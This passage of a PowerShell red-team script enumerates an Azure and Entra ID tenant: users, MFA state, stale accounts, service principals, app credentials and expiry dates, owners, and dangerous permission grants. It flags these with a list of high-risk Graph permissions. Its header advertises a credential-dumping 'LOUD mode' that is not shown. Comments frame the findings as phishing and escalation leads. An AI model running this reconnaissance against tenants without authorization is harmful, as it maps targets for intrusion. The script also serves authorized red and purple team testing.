<#
.SYNOPSIS
    T1526 - Cloud Service Discovery - Red Team TTP Demo (Deep Enumeration + Excel/CSV Report)
.DESCRIPTION
    Performs broad, operator-oriented enumeration across Azure, Entra ID, M365 trust
    configuration, and hybrid / federation surface. Writes everything to a single
    multi-sheet Excel workbook (or a folder of CSVs if ImportExcel isn't available).

    Enumeration categories:
      1. Subscriptions / Resource Groups / Resources / ResourceType summary
      2. Entra ID Users + Groups + GuestUsers + StaleUsers + MFAStatus
      3. Service Principals + App Registrations + AppPermissions + AppCredentials
         + AppFederatedCredentials + AppOwners
      4. Privileged Identity: directory role assignments, PIM-eligible, admin units,
         privileged (role-assignable) groups, privileged service principals
      5. Azure RBAC: every role assignment across every subscription + custom roles
         + classic administrators
      6. Juicy Resources: Storage, Key Vaults, Automation, App Services,
         Managed Identities, Container Registries
      7. Network Exposure: NSGs + rules flagged for internet exposure, Public IPs
      8. Hybrid / Federation / Cross-Tenant access policies
      9. Conditional Access, Named Locations, Security Defaults, Auth Methods Policy
      X. External attack surface (MicroBurst-style unauth subdomain + blob sweep)
      C. Credential-storage audit (names-only, no values pulled)
      H. Azure Arc hybrid inventory (on-prem machines, AKS, SQL-on-Arc)
      L. LOUD mode - full MicroBurst offensive (storage keys, KV secret VALUES,
         Automation cred VALUES, optional VM/App-Service command exec)
      A. ALL of the above (excludes LOUD mode - includes 1-9 + X + C + H)

    Read-only by design for options 1-9, X, C, and H. Does NOT pull secret values,
    storage keys, app-service config values, or runbook content in those modes - those
    are data-plane actions that generate loud alerts. Option L explicitly opts into
    full MicroBurst offensive behavior behind a double-confirmation gate.

    Integrates capabilities inspired by NetSPI's MicroBurst toolkit:
      - Unauthenticated DNS-based Azure service discovery (*.azurewebsites.net,
        *.blob.core.windows.net, *.vault.azure.net, *.database.windows.net, etc.)
      - Public blob container enumeration on discovered storage accounts
      - Credential asset discovery (Automation Account credentials, KV secret/key/cert
        names, AKS admin-cred availability, App Service publishing creds)
      - Azure Arc hybrid-cloud inventory (HybridCompute, connected K8s, SQL-on-Arc)
      - Optional loud-mode offensive operations (gated behind YES-I-MEAN-IT prompt)

    For authorized red team / purple team use only.
#>

# =============================================================================
# STEP 1: Module bootstrap
# =============================================================================
Write-Host "`n[*] Checking prerequisites..." -ForegroundColor Cyan

$requiredModules = @("Az.Accounts", "Az.Resources")
$optionalModules = @("ImportExcel")
$script:ExcelAvailable = $false

foreach ($module in $requiredModules) {
    if (-not (Get-Module -ListAvailable -Name $module)) {
        Write-Host "[*] Installing $module module..." -ForegroundColor Yellow
        Install-Module -Name $module -Force -Scope CurrentUser
        Write-Host "[+] $module installed." -ForegroundColor Green
    } else {
        Write-Host "[+] $module already installed." -ForegroundColor Green
    }
}

foreach ($module in $optionalModules) {
    if (-not (Get-Module -ListAvailable -Name $module)) {
        try {
            Write-Host "[*] Installing $module (optional, for native .xlsx export)..." -ForegroundColor Yellow
            Install-Module -Name $module -Force -Scope CurrentUser -ErrorAction Stop
            Write-Host "[+] $module installed." -ForegroundColor Green
        } catch {
            Write-Host "[!] Could not install $module - will fall back to CSV." -ForegroundColor Yellow
        }
    }
}

Import-Module Az.Accounts  -ErrorAction Stop
Import-Module Az.Resources -ErrorAction Stop

if (Get-Module -ListAvailable -Name ImportExcel) {
    try {
        Import-Module ImportExcel -ErrorAction Stop
        $script:ExcelAvailable = $true
        Write-Host "[+] ImportExcel loaded - report will be a single .xlsx workbook." -ForegroundColor Green
    } catch {
        Write-Host "[!] ImportExcel failed to load - report will fall back to CSV." -ForegroundColor Yellow
    }
} else {
    Write-Host "[!] ImportExcel not available - report will fall back to CSV." -ForegroundColor Yellow
}

Write-Host "[+] Modules loaded.`n" -ForegroundColor Green

# =============================================================================
# STEP 2: Interactive prompts
# =============================================================================
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  T1526 - Azure Resource Enumeration Setup  " -ForegroundColor Cyan
Write-Host "============================================`n" -ForegroundColor Cyan

$TenantId = Read-Host "Enter your Tenant ID or domain (e.g. company.onmicrosoft.com)"

Write-Host "`n[*] What would you like to enumerate?"
Write-Host "    1. Azure Subscriptions / Resource Groups / Resources"
Write-Host "    2. Entra ID Users, Groups, Guests, Stale Accounts, MFA State"
Write-Host "    3. Service Principals + App Registrations (perms, creds, FIC, owners)"
Write-Host "    4. Privileged Identity (directory roles, PIM, admin units, priv groups)"
Write-Host "    5. Azure RBAC (role assignments, custom roles, classic admins)"
Write-Host "    6. Juicy Resources (Storage, Key Vaults, Automation, App Svc, Mgd IDs, ACR)"
Write-Host "    7. Network Exposure (NSGs, Public IPs, internet-exposed rules)"
Write-Host "    8. Hybrid / Federation / Cross-Tenant Access"
Write-Host "    9. Conditional Access, Named Locations, Security Defaults, Auth Methods"
Write-Host "    --- MicroBurst-inspired modules ---" -ForegroundColor DarkCyan
Write-Host "    X. External attack surface (unauth DNS + blob sweep)"
Write-Host "    C. Credential-storage audit (names-only, no values pulled)"
Write-Host "    H. Azure Arc hybrid inventory (HybridCompute, AKS, SQL-on-Arc)"
Write-Host "    L. LOUD mode - full MicroBurst offensive (double-confirm required)" -ForegroundColor Red
Write-Host "    ------------------------------------" -ForegroundColor DarkCyan
Write-Host "    A. ALL of the above (1-9 + X + C + H, EXCLUDES loud mode)`n"
$Choice = (Read-Host "Enter choice (1-9, X, C, H, L, or A)").ToUpper()

$validChoices = @('1','2','3','4','5','6','7','8','9','X','C','H','L','A')
if ($validChoices -notcontains $Choice) {
    Write-Host "[!] Invalid choice '$Choice'. Valid: 1-9, X, C, H, L, A. Exiting." -ForegroundColor Red
    exit
}

$DefaultReportRoot = Join-Path -Path $PSScriptRoot -ChildPath "Reports"
$ReportRootInput   = Read-Host "`nReport output folder (press Enter for '$DefaultReportRoot')"
if ([string]::IsNullOrWhiteSpace($ReportRootInput)) { $ReportRootInput = $DefaultReportRoot }

if (-not (Test-Path $ReportRootInput)) {
    try { New-Item -ItemType Directory -Path $ReportRootInput -Force | Out-Null }
    catch {
        Write-Host "[!] Could not create '$ReportRootInput'. Falling back to script folder." -ForegroundColor Yellow
        $ReportRootInput = $PSScriptRoot
    }
}

$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

# =============================================================================
# STEP 3: Confirm
# =============================================================================
Write-Host "`n[*] About to enumerate tenant resources:" -ForegroundColor Cyan
Write-Host "    Tenant      : $TenantId"
Write-Host "    Scope       : Option $Choice"
Write-Host "    Report root : $ReportRootInput"
Write-Host "    Format      : $(if ($script:ExcelAvailable) {'Excel (.xlsx)'} else {'CSV (one file per sheet)'})"
Write-Host "    Timestamp   : $Timestamp"

$confirm = Read-Host "`nProceed? (yes/no)"
if ($confirm -ne "yes") {
    Write-Host "[!] Aborted by user." -ForegroundColor Yellow
    exit
}

# =============================================================================
# STEP 4: Authenticate (Az) + acquire Graph and ARM bearer tokens
# =============================================================================
Write-Host "`n[*] Authenticating to Azure..." -ForegroundColor Cyan
Write-Host "[*] A browser window will open for login.`n" -ForegroundColor Yellow

Connect-AzAccount -TenantId $TenantId -ErrorAction Stop | Out-Null
Write-Host "[+] Authenticated successfully.`n" -ForegroundColor Green

$CurrentContext = Get-AzContext
$OperatorUpn    = $CurrentContext.Account.Id
$ResolvedTenant = $CurrentContext.Tenant.Id

# -----------------------------------------------------------------------------
# Token acquisition helpers
# -----------------------------------------------------------------------------
# Az.Accounts >= 2.17 changed Get-AzAccessToken so that .Token is returned as a
# SecureString by default. Older versions returned a plain [string]. If we just
# stuff $tok.Token into "Bearer $tok" without checking, PowerShell stringifies
# a SecureString to the literal text "System.Security.SecureString" which the
# API rejects as 401 Unauthorized. This helper returns a PLAIN string JWT
# regardless of Az.Accounts version.
function Get-AzPlainToken {
    param(
        [Parameter(Mandatory=$true)][string]$ResourceUrl
    )
    # Prefer the explicit opt-out when the parameter exists (newer Az.Accounts).
    $params = @{ ResourceUrl = $ResourceUrl; ErrorAction = 'Stop' }
    $cmd    = Get-Command Get-AzAccessToken -ErrorAction Stop
    if ($cmd.Parameters.ContainsKey('AsSecureString')) {
        # Explicitly ask for a plain string. This is the cleanest path on newer modules.
        $raw = Get-AzAccessToken @params -AsSecureString:$false
    } else {
        $raw = Get-AzAccessToken @params
    }

    $tok = $raw.Token
    if ($tok -is [System.Security.SecureString]) {
        # Unwrap a SecureString to plaintext without depending on PS7-only syntax.
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($tok)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        } finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    return [string]$tok
}

function Get-GraphToken {
    $token = Get-AzPlainToken -ResourceUrl "https://graph.microsoft.com"
    return @{ Authorization = "Bearer $token"; ConsistencyLevel = "eventual" }
}

function Get-ArmToken {
    $token = Get-AzPlainToken -ResourceUrl "https://management.azure.com"
    return @{ Authorization = "Bearer $token" }
}

# Sanity-check: a real JWT has three dot-separated base64url segments. If we
# somehow still got a SecureString-stringified or empty token, warn loudly and
# bail out instead of spraying 401s at every endpoint.
$__graphProbe = Get-AzPlainToken -ResourceUrl "https://graph.microsoft.com"
if ([string]::IsNullOrWhiteSpace($__graphProbe) -or
    ($__graphProbe -split '\.').Count -ne 3 -or
    $__graphProbe -like '*SecureString*') {
    Write-Host "[!] Graph access token does not look like a JWT. Raw length=$($__graphProbe.Length)" -ForegroundColor Red
    Write-Host "    This usually means Az.Accounts is returning a SecureString and the unwrapper failed." -ForegroundColor Red
    Write-Host "    Try:  Update-Module Az.Accounts -Force   (then open a fresh PowerShell and rerun)" -ForegroundColor Yellow
    throw "Aborting: invalid Graph token."
}
Remove-Variable __graphProbe -ErrorAction SilentlyContinue

function Invoke-GraphPaged {
    param([string]$Uri)
    $results = New-Object System.Collections.Generic.List[object]
    $next = $Uri
    while ($next) {
        try {
            $resp = Invoke-RestMethod -Uri $next -Headers (Get-GraphToken) -ErrorAction Stop
            if ($resp.value) { foreach ($i in $resp.value) { $null = $results.Add($i) } }
            elseif ($resp) { $null = $results.Add($resp) }
            $next = $resp.'@odata.nextLink'
        } catch {
            Write-Host "[-] Graph failed: $next -> $($_.Exception.Message)" -ForegroundColor Red
            break
        }
    }
    ,$results
}

function Invoke-ArmPaged {
    param([string]$Uri)
    $results = New-Object System.Collections.Generic.List[object]
    $next = $Uri
    while ($next) {
        try {
            $resp = Invoke-RestMethod -Uri $next -Headers (Get-ArmToken) -ErrorAction Stop
            if ($resp.value) { foreach ($i in $resp.value) { $null = $results.Add($i) } }
            elseif ($resp) { $null = $results.Add($resp) }
            $next = $resp.nextLink
        } catch {
            Write-Host "[-] ARM failed: $next -> $($_.Exception.Message)" -ForegroundColor Red
            break
        }
    }
    ,$results
}

# Known dangerous Graph permissions (delegated + app roles).
# Any app/consent carrying one of these gets flagged in the AppPermissions sheet.
$script:DangerousPermissions = @(
    'RoleManagement.ReadWrite.Directory',
    'Application.ReadWrite.All',
    'AppRoleAssignment.ReadWrite.All',
    'Directory.ReadWrite.All',
    'User.ReadWrite.All',
    'GroupMember.ReadWrite.All',
    'Group.ReadWrite.All',
    'Mail.ReadWrite',
    'Mail.Read',
    'Mail.Send',
    'MailboxSettings.ReadWrite',
    'Files.ReadWrite.All',
    'Sites.ReadWrite.All',
    'Sites.FullControl.All',
    'full_access_as_app',
    'Directory.AccessAsUser.All',
    'Policy.ReadWrite.ConditionalAccess',
    'Policy.ReadWrite.AuthenticationMethod',
    'UserAuthenticationMethod.ReadWrite.All',
    'PrivilegedAccess.ReadWrite.AzureAD',
    'Chat.ReadWrite.All',
    'ChannelMessage.ReadWrite.All'
)

# =============================================================================
# STEP 5: Report buffer (one key per worksheet)
# =============================================================================
$Report = [ordered]@{
    Subscriptions                = New-Object System.Collections.Generic.List[object]
    ResourceGroups               = New-Object System.Collections.Generic.List[object]
    Resources                    = New-Object System.Collections.Generic.List[object]
    ResourceTypesSummary         = New-Object System.Collections.Generic.List[object]

    Users                        = New-Object System.Collections.Generic.List[object]
    Groups                       = New-Object System.Collections.Generic.List[object]
    GuestUsers                   = New-Object System.Collections.Generic.List[object]
    StaleUsers                   = New-Object System.Collections.Generic.List[object]
    MFAStatus                    = New-Object System.Collections.Generic.List[object]

    ServicePrincipals            = New-Object System.Collections.Generic.List[object]
    AppRegistrations             = New-Object System.Collections.Generic.List[object]
    AppPermissions               = New-Object System.Collections.Generic.List[object]
    AppCredentials               = New-Object System.Collections.Generic.List[object]
    AppFederatedCredentials      = New-Object System.Collections.Generic.List[object]
    AppOwners                    = New-Object System.Collections.Generic.List[object]

    DirectoryRoleAssignments     = New-Object System.Collections.Generic.List[object]
    PIMEligibleRoles             = New-Object System.Collections.Generic.List[object]
    AdministrativeUnits          = New-Object System.Collections.Generic.List[object]
    PrivilegedGroups             = New-Object System.Collections.Generic.List[object]
    PrivilegedServicePrincipals  = New-Object System.Collections.Generic.List[object]

    RbacAssignments              = New-Object System.Collections.Generic.List[object]
    CustomRoles                  = New-Object System.Collections.Generic.List[object]
    ClassicAdmins                = New-Object System.Collections.Generic.List[object]

    StorageAccounts              = New-Object System.Collections.Generic.List[object]
    KeyVaults                    = New-Object System.Collections.Generic.List[object]
    AutomationAccounts           = New-Object System.Collections.Generic.List[object]
    AppServices                  = New-Object System.Collections.Generic.List[object]
    ManagedIdentities            = New-Object System.Collections.Generic.List[object]
    ContainerRegistries          = New-Object System.Collections.Generic.List[object]

    NSGs                         = New-Object System.Collections.Generic.List[object]
    NSGRules                     = New-Object System.Collections.Generic.List[object]
    PublicIPs                    = New-Object System.Collections.Generic.List[object]

    FederationSettings           = New-Object System.Collections.Generic.List[object]
    CrossTenantAccess            = New-Object System.Collections.Generic.List[object]

    ConditionalAccessPolicies    = New-Object System.Collections.Generic.List[object]
    NamedLocations               = New-Object System.Collections.Generic.List[object]
    SecurityDefaults             = New-Object System.Collections.Generic.List[object]
    AuthMethodsPolicies          = New-Object System.Collections.Generic.List[object]

    # --- MicroBurst-inspired modules (X, C, H, L) ---
    ExternalSubdomains           = New-Object System.Collections.Generic.List[object]
    ExternalBlobs                = New-Object System.Collections.Generic.List[object]
    ExternalAttackSurfaceSummary = New-Object System.Collections.Generic.List[object]

    CredentialExposure           = New-Object System.Collections.Generic.List[object]

    ArcMachines                  = New-Object System.Collections.Generic.List[object]
    ArcExtensions                = New-Object System.Collections.Generic.List[object]
    ArcKubernetes                = New-Object System.Collections.Generic.List[object]
    ArcSqlInstances              = New-Object System.Collections.Generic.List[object]

    LoudStorageKeys              = New-Object System.Collections.Generic.List[object]
    LoudKeyVaultSecrets          = New-Object System.Collections.Generic.List[object]
    LoudAutomationCreds          = New-Object System.Collections.Generic.List[object]
    LoudCommandExecution         = New-Object System.Collections.Generic.List[object]

    # Executive-summary / pivot sheet: every enumerated category mapped to the
    # MITRE ATT&CK technique(s) it enables. Populated by Build-MITREThreatMap
    # AFTER all Enumerate-* functions run, so Count/HighValueCount are live.
    MITREThreatMap               = New-Object System.Collections.Generic.List[object]
}

# Cache of all subscriptions - populated on first use
$script:SubscriptionsCache = $null
function Get-AllSubscriptions {
    if ($null -eq $script:SubscriptionsCache) {
        $script:SubscriptionsCache = Get-AzSubscription -ErrorAction SilentlyContinue
    }
    return $script:SubscriptionsCache
}

# =============================================================================
# STEP 6: Enumeration functions
# =============================================================================

# -----------------------------------------------------------------------------
function Enumerate-Subscriptions {
    Write-Host "`n[*] Enumerating Azure Subscriptions, Resource Groups, Resources..." -ForegroundColor Yellow
    $subs = Get-AllSubscriptions
    Write-Host "    Found $($subs.Count) subscription(s)." -ForegroundColor Green

    foreach ($sub in $subs) {
        $null = $Report.Subscriptions.Add([PSCustomObject]@{
            Name     = $sub.Name
            Id       = $sub.Id
            TenantId = $sub.TenantId
            State    = $sub.State
        })

        Set-AzContext -SubscriptionId $sub.Id | Out-Null

        $rgs = Get-AzResourceGroup -ErrorAction SilentlyContinue
        Write-Host "    [$($sub.Name)] ResourceGroups: $($rgs.Count)" -ForegroundColor Cyan
        foreach ($rg in $rgs) {
            $null = $Report.ResourceGroups.Add([PSCustomObject]@{
                SubscriptionName  = $sub.Name
                SubscriptionId    = $sub.Id
                ResourceGroupName = $rg.ResourceGroupName
                Location          = $rg.Location
                ProvisioningState = $rg.ProvisioningState
                Tags              = if ($rg.Tags) { ($rg.Tags.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '; ' } else { '' }
            })
        }

        $resources = Get-AzResource -ErrorAction SilentlyContinue
        Write-Host "    [$($sub.Name)] Resources: $($resources.Count)" -ForegroundColor Cyan
        foreach ($res in $resources) {
            $null = $Report.Resources.Add([PSCustomObject]@{
                SubscriptionName  = $sub.Name
                SubscriptionId    = $sub.Id
                Name              = $res.Name
                ResourceType      = $res.ResourceType
                Kind              = $res.Kind
                Location          = $res.Location
                ResourceGroupName = $res.ResourceGroupName
                ResourceId        = $res.ResourceId
                Sku               = if ($res.Sku) { $res.Sku.Name } else { '' }
            })
        }
        foreach ($t in ($resources | Group-Object ResourceType | Sort-Object Count -Descending)) {
            $null = $Report.ResourceTypesSummary.Add([PSCustomObject]@{
                SubscriptionName = $sub.Name
                SubscriptionId   = $sub.Id
                ResourceType     = $t.Name
                Count            = $t.Count
            })
        }
    }
}

# -----------------------------------------------------------------------------
function Enumerate-Users {
    Write-Host "`n[*] Enumerating Entra ID Users, Groups, Guests, Stale Accounts, MFA..." -ForegroundColor Yellow

    # Users (pull signInActivity too, so we can derive stale accounts)
    $uri = "https://graph.microsoft.com/v1.0/users?`$top=999&`$select=id,displayName,userPrincipalName,userType,accountEnabled,mail,jobTitle,department,createdDateTime,onPremisesSyncEnabled,signInActivity"
    $allUsers = Invoke-GraphPaged -Uri $uri
    Write-Host "    Users captured: $($allUsers.Count)" -ForegroundColor Green

    $staleCutoff = (Get-Date).AddDays(-90)
    foreach ($u in $allUsers) {
        $lastSignIn = $null
        if ($u.signInActivity -and $u.signInActivity.lastSignInDateTime) {
            $lastSignIn = [DateTime]$u.signInActivity.lastSignInDateTime
        }

        $null = $Report.Users.Add([PSCustomObject]@{
            Id                   = $u.id
            DisplayName          = $u.displayName
            UserPrincipalName    = $u.userPrincipalName
            UserType             = $u.userType
            AccountEnabled       = $u.accountEnabled
            Mail                 = $u.mail
            JobTitle             = $u.jobTitle
            Department           = $u.department
            CreatedDateTime      = $u.createdDateTime
            OnPremisesSynced     = $u.onPremisesSyncEnabled
            LastSignInDateTime   = $lastSignIn
        })

        if ($u.userType -eq 'Guest') {
            # Derive the external domain from a guest UPN like:
            #   alice_contoso.com#EXT#@tenant.onmicrosoft.com   -> contoso.com
            # Fall back to the domain of the 'mail' attribute if that fails.
            $extDomain = ''
            $extTag = [char]0x23 + 'EXT' + [char]0x23   # literal "#EXT#" built from chars to avoid any parser surprises
            if ($u.userPrincipalName -and $u.userPrincipalName.Contains($extTag)) {
                $localPart = ($u.userPrincipalName -split [regex]::Escape($extTag))[0]
                $lastUnderscore = $localPart.LastIndexOf('_')
                if ($lastUnderscore -ge 0 -and $lastUnderscore -lt $localPart.Length - 1) {
                    $extDomain = $localPart.Substring($lastUnderscore + 1)
                }
            }
            if (-not $extDomain -and $u.mail -and $u.mail.Contains('@')) {
                $extDomain = ($u.mail -split '@')[-1]
            }

            $null = $Report.GuestUsers.Add([PSCustomObject]@{
                DisplayName         = $u.displayName
                UserPrincipalName   = $u.userPrincipalName
                Mail                = $u.mail
                ExternalDomain      = $extDomain
                CreatedDateTime     = $u.createdDateTime
                AccountEnabled      = $u.accountEnabled
                LastSignInDateTime  = $lastSignIn
            })
        }

        if ($u.accountEnabled -eq $true -and $lastSignIn -and $lastSignIn -lt $staleCutoff) {
            $null = $Report.StaleUsers.Add([PSCustomObject]@{
                DisplayName        = $u.displayName
                UserPrincipalName  = $u.userPrincipalName
                UserType           = $u.userType
                LastSignInDateTime = $lastSignIn
                DaysStale          = [int]((Get-Date) - $lastSignIn).TotalDays
                AccountEnabled     = $u.accountEnabled
            })
        }
    }
    Write-Host "    Guests: $($Report.GuestUsers.Count), Stale-enabled accounts (>90d): $($Report.StaleUsers.Count)" -ForegroundColor Cyan

    # Groups
    $uri = "https://graph.microsoft.com/v1.0/groups?`$top=999&`$select=id,displayName,mailEnabled,securityEnabled,groupTypes,description,createdDateTime,isAssignableToRole"
    $allGroups = Invoke-GraphPaged -Uri $uri
    foreach ($g in $allGroups) {
        $null = $Report.Groups.Add([PSCustomObject]@{
            Id                 = $g.id
            DisplayName        = $g.displayName
            MailEnabled        = $g.mailEnabled
            SecurityEnabled    = $g.securityEnabled
            GroupTypes         = ($g.groupTypes -join ', ')
            IsAssignableToRole = $g.isAssignableToRole
            Description        = $g.description
            CreatedDateTime    = $g.createdDateTime
        })
    }
    Write-Host "    Groups: $($Report.Groups.Count)" -ForegroundColor Cyan

    # MFA / authentication methods registration state
    try {
        $uri = "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?`$top=999"
        $mfa = Invoke-GraphPaged -Uri $uri
        foreach ($m in $mfa) {
            $null = $Report.MFAStatus.Add([PSCustomObject]@{
                UserPrincipalName      = $m.userPrincipalName
                DisplayName            = $m.userDisplayName
                IsMfaRegistered        = $m.isMfaRegistered
                IsMfaCapable           = $m.isMfaCapable
                IsSsprRegistered       = $m.isSsprRegistered
                IsSsprCapable          = $m.isSsprCapable
                IsPasswordlessCapable  = $m.isPasswordlessCapable
                DefaultMfaMethod       = $m.defaultMfaMethod
                MethodsRegistered      = ($m.methodsRegistered -join ', ')
                LastUpdatedDateTime    = $m.lastUpdatedDateTime
                UserType               = $m.userType
            })
        }
        Write-Host "    MFA registration rows: $($Report.MFAStatus.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] MFA registration report unavailable (needs Reports.Read.All / AuditLog.Read.All): $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# -----------------------------------------------------------------------------
function Enumerate-ServicePrincipals {
    Write-Host "`n[*] Enumerating SPNs, App Registrations, Permissions, Credentials..." -ForegroundColor Yellow

    # Service Principals
    $uri = "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999&`$select=id,appId,displayName,servicePrincipalType,accountEnabled,appOwnerOrganizationId,publisherName,signInAudience,tags,passwordCredentials,keyCredentials"
    $allSps = Invoke-GraphPaged -Uri $uri
    Write-Host "    Service Principals: $($allSps.Count)" -ForegroundColor Green

    foreach ($sp in $allSps) {
        $null = $Report.ServicePrincipals.Add([PSCustomObject]@{
            Id                     = $sp.id
            AppId                  = $sp.appId
            DisplayName            = $sp.displayName
            ServicePrincipalType   = $sp.servicePrincipalType
            AccountEnabled         = $sp.accountEnabled
            AppOwnerOrganizationId = $sp.appOwnerOrganizationId
            PublisherName          = $sp.publisherName
            SignInAudience         = $sp.signInAudience
            Tags                   = ($sp.tags -join ', ')
            IsFirstPartyMicrosoft  = ($sp.appOwnerOrganizationId -eq 'f8cdef31-a31e-4b4a-93e4-5f571e91255a')
        })

        # SPN credentials (password + key) — expiration intel is gold for phishing campaigns
        foreach ($pc in @($sp.passwordCredentials)) {
            if ($null -ne $pc) {
                $null = $Report.AppCredentials.Add([PSCustomObject]@{
                    OwnerType     = 'ServicePrincipal'
                    OwnerName     = $sp.displayName
                    OwnerId       = $sp.id
                    CredentialType= 'PasswordCredential'
                    KeyId         = $pc.keyId
                    DisplayName   = $pc.displayName
                    StartDateTime = $pc.startDateTime
                    EndDateTime   = $pc.endDateTime
                    Hint          = $pc.hint
                })
            }
        }
        foreach ($kc in @($sp.keyCredentials)) {
            if ($null -ne $kc) {
                $null = $Report.AppCredentials.Add([PSCustomObject]@{
                    OwnerType     = 'ServicePrincipal'
                    OwnerName     = $sp.displayName
                    OwnerId       = $sp.id
                    CredentialType= "KeyCredential/$($kc.type)"
                    KeyId         = $kc.keyId
                    DisplayName   = $kc.displayName
                    StartDateTime = $kc.startDateTime
                    EndDateTime   = $kc.endDateTime
                    Hint          = $kc.usage
                })
            }
        }
    }

    # App Registrations
    $uri = "https://graph.microsoft.com/v1.0/applications?`$top=999&`$select=id,appId,displayName,signInAudience,createdDateTime,publisherDomain,passwordCredentials,keyCredentials,web,requiredResourceAccess"
    $allApps = Invoke-GraphPaged -Uri $uri
    Write-Host "    App Registrations: $($allApps.Count)" -ForegroundColor Green

    foreach ($a in $allApps) {
        $replyUrls = @()
        if ($a.web -and $a.web.redirectUris) { $replyUrls = $a.web.redirectUris }
        $hasWildcard = ($replyUrls | Where-Object { $_ -match '\*' -or $_ -match 'localhost' }).Count -gt 0

        $null = $Report.AppRegistrations.Add([PSCustomObject]@{
            Id                 = $a.id
            AppId              = $a.appId
            DisplayName        = $a.displayName
            SignInAudience     = $a.signInAudience
            CreatedDateTime    = $a.createdDateTime
            PublisherDomain    = $a.publisherDomain
            ReplyUrls          = ($replyUrls -join '; ')
            HasWildcardOrLocal = $hasWildcard
            PasswordCredCount  = (@($a.passwordCredentials)).Count
            KeyCredCount       = (@($a.keyCredentials)).Count
        })

        # App-registration-side credentials
        foreach ($pc in @($a.passwordCredentials)) {
            if ($null -ne $pc) {
                $null = $Report.AppCredentials.Add([PSCustomObject]@{
                    OwnerType     = 'Application'
                    OwnerName     = $a.displayName
                    OwnerId       = $a.id
                    CredentialType= 'PasswordCredential'
                    KeyId         = $pc.keyId
                    DisplayName   = $pc.displayName
                    StartDateTime = $pc.startDateTime
                    EndDateTime   = $pc.endDateTime
                    Hint          = $pc.hint
                })
            }
        }
        foreach ($kc in @($a.keyCredentials)) {
            if ($null -ne $kc) {
                $null = $Report.AppCredentials.Add([PSCustomObject]@{
                    OwnerType     = 'Application'
                    OwnerName     = $a.displayName
                    OwnerId       = $a.id
                    CredentialType= "KeyCredential/$($kc.type)"
                    KeyId         = $kc.keyId
                    DisplayName   = $kc.displayName
                    StartDateTime = $kc.startDateTime
                    EndDateTime   = $kc.endDateTime
                    Hint          = $kc.usage
                })
            }
        }

        # Federated identity credentials — workload identity federation, hot modern vector
        try {
            $ficUri = "https://graph.microsoft.com/v1.0/applications/$($a.id)/federatedIdentityCredentials"
            $ficList = Invoke-GraphPaged -Uri $ficUri
            foreach ($fic in $ficList) {
                $null = $Report.AppFederatedCredentials.Add([PSCustomObject]@{
                    AppDisplayName = $a.displayName
                    AppId          = $a.appId
                    Name           = $fic.name
                    Issuer         = $fic.issuer
                    Subject        = $fic.subject
                    Audiences      = ($fic.audiences -join ', ')
                    Description    = $fic.description
                })
            }
        } catch { }

        # App owners (standard users owning privileged apps = escalation path)
        try {
            $ownerUri = "https://graph.microsoft.com/v1.0/applications/$($a.id)/owners?`$select=id,displayName,userPrincipalName"
            $owners = Invoke-GraphPaged -Uri $ownerUri
            foreach ($o in $owners) {
                $null = $Report.AppOwners.Add([PSCustomObject]@{
                    AppDisplayName    = $a.displayName
                    AppId             = $a.appId
                    OwnerDisplayName  = $o.displayName
                    OwnerUPN          = $o.userPrincipalName
                    OwnerId           = $o.id
                    OwnerOdataType    = $o.'@odata.type'
                })
            }
        } catch { }
    }

    # Delegated permission grants (oauth2) tenant-wide
    try {
        $uri = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?`$top=999"
        $grants = Invoke-GraphPaged -Uri $uri
        foreach ($g in $grants) {
            $scopeString = ($g.scope -as [string]).Trim()
            $dangerous = @()
            foreach ($s in $scopeString -split '\s+') {
                if ($script:DangerousPermissions -contains $s) { $dangerous += $s }
            }
            $null = $Report.AppPermissions.Add([PSCustomObject]@{
                GrantType        = 'Delegated (OAuth2PermissionGrant)'
                ClientId         = $g.clientId
                ConsentType      = $g.consentType
                PrincipalId      = $g.principalId
                ResourceId       = $g.resourceId
                Scope            = $scopeString
                DangerousMatches = ($dangerous -join ', ')
                IsDangerous      = [bool]($dangerous.Count)
            })
        }
        Write-Host "    Delegated permission grants: $($grants.Count)" -ForegroundColor Cyan
    } catch {
        Write-Host "    [!] Could not enumerate oauth2PermissionGrants: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # App-role assignments (application permissions) — scoped to tenant-owned SPNs
    # to keep run time reasonable. First-party Microsoft SPNs are skipped.
    $tenantSps = $allSps | Where-Object { $_.appOwnerOrganizationId -eq $ResolvedTenant }
    Write-Host "    Tenant-owned SPNs (for app-role enumeration): $($tenantSps.Count)" -ForegroundColor Cyan
    $i = 0
    foreach ($sp in $tenantSps) {
        $i++
        if ($i % 25 -eq 0) { Write-Host "      [...] $i / $($tenantSps.Count)" -ForegroundColor DarkGray }
        try {
            $uri = "https://graph.microsoft.com/v1.0/servicePrincipals/$($sp.id)/appRoleAssignments"
            $assigns = Invoke-GraphPaged -Uri $uri
            foreach ($ar in $assigns) {
                # Resolve appRoleId to a display value by querying the resource SPN's appRoles (cache could optimize later)
                $roleName = $ar.appRoleId
                try {
                    $resUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$($ar.resourceId)?`$select=appRoles"
                    $resp = Invoke-RestMethod -Uri $resUri -Headers (Get-GraphToken) -ErrorAction Stop
                    $match = $resp.appRoles | Where-Object { $_.id -eq $ar.appRoleId } | Select-Object -First 1
                    if ($match) { $roleName = $match.value }
                } catch { }

                $dangerous = ($script:DangerousPermissions -contains $roleName)
                $null = $Report.AppPermissions.Add([PSCustomObject]@{
                    GrantType        = 'Application (AppRoleAssignment)'
                    ClientId         = $sp.appId
                    ConsentType      = 'AdminConsent'
                    PrincipalId      = $sp.id
                    ResourceId       = $ar.resourceId
                    Scope            = $roleName
                    DangerousMatches = if ($dangerous) { $roleName } else { '' }
                    IsDangerous      = $dangerous
                })
            }
        } catch { }
    }
    Write-Host "    Total permission rows: $($Report.AppPermissions.Count) (dangerous: $(($Report.AppPermissions | Where-Object { $_.IsDangerous }).Count))" -ForegroundColor Cyan
}

# -----------------------------------------------------------------------------
